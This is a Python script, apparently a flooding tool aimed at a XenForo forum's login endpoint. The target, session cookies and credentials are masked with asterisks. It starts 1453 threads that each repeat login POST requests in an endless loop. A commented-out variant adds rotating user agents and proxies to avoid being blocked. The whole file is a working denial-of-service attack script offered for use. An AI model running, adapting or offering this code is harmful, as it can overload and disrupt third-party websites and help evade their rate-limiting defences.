import requests
import threading
import time

#▄▄███▄▄· ██████╗██████╗ ██╗██████╗ ████████╗    ██╗███████╗    ██████╗ ███████╗ █████╗ ██╗     
#██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝    ██║██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║     
#███████╗██║     ██████╔╝██║██████╔╝   ██║       ██║███████╗    ██████╔╝█████╗  ███████║██║     
#╚════██║██║     ██╔══██╗╚═╝██╔═══╝    ██║       ╚═╝╚════██║    ██╔══██╗██╔══╝  ██╔══██║██║     
#███████║╚██████╗██║  ██║██╗██║        ██║       ██╗███████║    ██║  ██║███████╗██║  ██║███████╗
#╚═▀▀▀══╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝       ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                              
cookies = {
    'xf_csrf': '***********************',
    'xf_session': '********************',
}

headers = {
    'authority': '*********************',
    'accept': '************************',
    'accept-language': '***************',
    'cache-control': '*****************',
    # Requests sorts cookies= alphabetically
    'cookie': '************************',
    'origin': '************************',
    'referer': '***********************',
    'sec-fetch-dest': '****************',
    'sec-fetch-mode': '****************',
    'sec-fetch-site': '****************',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': '**************************',
}

data = {
    '_xfToken': '******************************',
    'login': '*********************************',
    'password': '******************************',
    'remember': '1',
    '_xfRedirect': 'https://***************.com/',
}


# user agent method 
#user_agents = []
#with open('useragent.txt', 'r') as file:
#    user_agents = [line.strip() for line in file]

# proxy off
def script():
    while True:
        try:
            response = requests.post('https://***************', cookies=cookies, headers=headers, data=data)
            response.raise_for_status()
            print(response.text)
        except Exception as e:
            print(f"Error occurred: {e}")
            pass

#proxy on
# def script():
#     while True:
#         try:
#             random_user_agent = random.choice(user_agents)
#             
#             headers['user-agent'] = random_user_agent 
#             
#             proxies = {'http': proxy_url, 'https': proxy_url}
#             
#             response = requests.post('https://***************', headers=headers, data=data, proxies=proxies) #verify=False <- ssl pass)
#             response.raise_for_status()
#             print(response.text)
#         except Exception as e:
#             print(f"Hata oluştu: {e}")
#             pass



threads = []

for i in range(1453):
    sch = threading.Thread(target=script)
    sch.daemon = True
    threads.append(sch)

for i in range(1453):
    threads[i].start()

while threading.active_count() > 1:
    time.sleep(1)

print("All threads finished.")
